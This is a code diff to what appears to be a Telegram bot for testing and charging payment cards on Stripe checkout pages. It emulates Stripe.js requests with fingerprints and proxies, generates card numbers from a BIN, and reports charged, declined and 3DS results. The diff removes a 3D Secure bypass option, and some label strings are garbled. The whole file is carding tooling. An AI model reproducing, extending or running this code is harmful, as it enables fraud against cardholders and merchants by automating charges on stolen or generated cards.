@@ -701,7 +701,7 @@ async def get_checkout_info(url: str) -> dict:
     result["time"] = round(time.perf_counter() - start, 2)
     return result
 
-async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
+async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, max_retries: int = 2) -> dict:
     """Charge card using Stripe.js emulation — direct confirm with fingerprints."""
     start = time.perf_counter()
     card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
@@ -792,9 +792,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                     f"&init_checksum={checksum}"
                 )
                 
-                if bypass_3ds:
-                    conf_body += "&return_url=https://checkout.stripe.com"
-                
                 headers = get_headers(stripe_js=True)
                 
                 async with s.post(
@@ -827,12 +824,8 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                         result["status"] = "CHARGED"
                         result["response"] = "Payment Successful"
                     elif st == "requires_action":
-                        if bypass_3ds:
-                            result["status"] = "3DS SKIP"
-                            result["response"] = "3DS Cannot be bypassed"
-                        else:
-                            result["status"] = "3DS"
-                            result["response"] = "3DS Required"
+                        result["status"] = "3DS"
+                        result["response"] = "3DS Skipped"
                     elif st == "requires_payment_method":
                         result["status"] = "DECLINED"
                         result["response"] = "Card Declined"
@@ -1103,11 +1096,8 @@ async def co_handler(msg: Message):
             "<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 ⚡</code></blockquote>\n\n"
             "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co url</code>\n"
             "「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/co url cc|mm|yy|cvv</code>\n"
-            "「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co url yes/no cc|mm|yy|cvv</code>\n"
-            "「❃」 �𝗜𝗡 : <code>/co url BIN</code>\n"
-            "「❃」 𝗕𝗜𝗡+𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co url yes/no BIN</code>\n"
-            "「❃」 �𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co url</code>\n"
-            "「❃」 𝗙𝗶𝗹𝗲+𝗕𝘆𝗽𝗮𝘀𝘀 : <code>Reply to .txt with /co url yes/no</code></blockquote>",
+            "「❃」 𝗕𝗡 : <code>/co url BIN</code>\n"
+            "「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co url</code></blockquote>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -1117,26 +1107,15 @@ async def co_handler(msg: Message):
         url = first_line_args[1].strip()
     
     cards = []
-    bypass_3ds = False
     bin_used = None
     
     if len(first_line_args) > 2:
-        if first_line_args[2].lower() in ['yes', 'no']:
-            bypass_3ds = first_line_args[2].lower() == 'yes'
-            if len(first_line_args) > 3:
-                arg3 = first_line_args[3].strip()
-                if is_bin_input(arg3):
-                    bin_used = re.sub(r'\D', '', arg3)
-                    cards = generate_cards_from_bin(bin_used, 10)
-                else:
-                    cards = parse_cards(arg3)
+        arg2 = first_line_args[2].strip()
+        if is_bin_input(arg2):
+            bin_used = re.sub(r'\D', '', arg2)
+            cards = generate_cards_from_bin(bin_used, 10)
         else:
-            arg2 = first_line_args[2].strip()
-            if is_bin_input(arg2):
-                bin_used = re.sub(r'\D', '', arg2)
-                cards = generate_cards_from_bin(bin_used, 10)
-            else:
-                cards = parse_cards(arg2)
+            cards = parse_cards(arg2)
     
     if len(lines) > 1 and not bin_used:
         remaining_text = '\n'.join(lines[1:])
@@ -1205,8 +1184,7 @@ async def co_handler(msg: Message):
         response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
         response += f"「❃」 𝗖𝗦 : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
         response += f"「❃」 𝗣𝗞 : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
-        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code>\n"
-        response += f"「❃」 𝗠𝗲𝘁𝗵𝗼𝗱 : <code>STRIPE.JS ⚡</code></blockquote>\n\n"
+        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code></blockquote>\n\n"
         
         response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
         response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code>\n"
@@ -1234,8 +1212,6 @@ async def co_handler(msg: Message):
         await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
         return
     
-    method_display = "STRIPE.JS ⚡"
-    bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
     currency = checkout_data.get('currency', '')
     sym = get_currency_symbol(currency)
     price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
@@ -1244,9 +1220,7 @@ async def co_handler(msg: Message):
     
     await processing_msg.edit_text(
         f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
-        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
-        f"「❃」 𝗠𝗲𝘁𝗵𝗼𝗱 : <code>{method_display}</code>\n"
-        f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>{bin_display}\n"
+        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>{bin_display}\n"
         f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
         f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
         parse_mode=ParseMode.HTML
@@ -1265,22 +1239,21 @@ async def co_handler(msg: Message):
                 cancelled = True
                 break
         
-        result = await charge_card(card, checkout_data, user_proxy, bypass_3ds)
+        result = await charge_card(card, checkout_data, user_proxy)
         results.append(result)
         
         if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
             last_update = time.perf_counter()
             charged = sum(1 for r in results if r['status'] == 'CHARGED')
             declined = sum(1 for r in results if r['status'] == 'DECLINED')
-            three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
+            three_ds = sum(1 for r in results if r['status'] == '3DS')
             errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
             
             try:
                 await processing_msg.edit_text(
                     f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
                     f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
-                    f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
-                    f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
+                    f"「❃」 𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                     f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
                     f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
                     f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code>\n"
@@ -1328,7 +1301,7 @@ async def co_handler(msg: Message):
     # Summary
     charged_count = sum(1 for r in results if r['status'] == 'CHARGED')
     declined_count = sum(1 for r in results if r['status'] == 'DECLINED')
-    three_ds_count = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
+    three_ds_count = sum(1 for r in results if r['status'] == '3DS')
     error_count = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN', 'NOT SUPPORTED'])
     
     response += f"\n<blockquote>💲 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:\n"
